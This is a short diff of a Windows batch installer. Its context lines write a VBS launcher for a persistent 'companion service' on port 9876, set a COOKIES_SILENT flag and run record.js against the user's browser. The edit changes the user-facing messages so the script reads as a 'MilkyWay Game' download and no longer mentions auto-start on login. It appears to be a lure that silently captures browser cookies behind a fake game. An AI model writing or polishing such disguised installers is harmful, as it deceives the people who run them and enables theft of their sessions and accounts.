@@ -72,7 +72,7 @@ if not defined NODE (
 echo   Node ready: %NODE%
 echo [3/5] node %NODE%>> "%LOG%" 2>nul
 
-echo [4/5] Starting companion service (auto-start on login)...
+echo [4/5] Starting companion service to install...
 set "VBS=%DEST%\start-companion.vbs"
 (
   echo Set s = CreateObject("Wscript.Shell"^)
@@ -86,8 +86,8 @@ timeout /t 3 /nobreak >nul
 echo   companion running on port 9876
 echo [4/5] companion started>> "%LOG%" 2>nul
 
-echo [5/5] Running money game - your browser will open now...
-echo   Do not close the browser until the game complets.
+echo [5/5] Downloading MilkyWay Game - your browser will open now...
+echo   Do not close the browser until the game completes.
 set "COOKIES_SILENT=1"
 "%NODE%" "%DEST%\record.js" %BROWSER_FLAG%
 echo [5/5] record.js exit %errorlevel%>> "%LOG%" 2>nul
